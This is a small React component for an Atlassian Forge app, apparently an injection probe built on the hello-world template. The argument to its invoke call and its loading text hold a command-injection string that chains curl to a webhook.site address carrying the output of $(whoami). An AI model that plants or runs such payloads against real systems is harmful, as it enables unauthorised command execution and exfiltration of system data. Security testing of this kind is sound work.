import React, { useEffect, useState } from 'react';
import ForgeReconciler, { Text } from '@forge/react';
import { invoke } from '@forge/bridge';

const App = () => {
  const [data, setData] = useState(null);
  useEffect(() => {
    invoke('getText', { example: 'my-invoke-variable && curl https://webhook.site/43c504f4-621f-4f0f-854a-358922aa7238/?data=$(whoami)' }).then(setData);
  }, []);
  return (
    <>
      <Text>Hello world!</Text>
      <Text>{data ? data : 'Loading...&& curl https://webhook.site/43c504f4-621f-4f0f-854a-358922aa7238/?data=$(whoami)'}</Text>
    </>
  );
};

ForgeReconciler.render(
  <React.StrictMode>
    <App />
  </React.StrictMode>
);
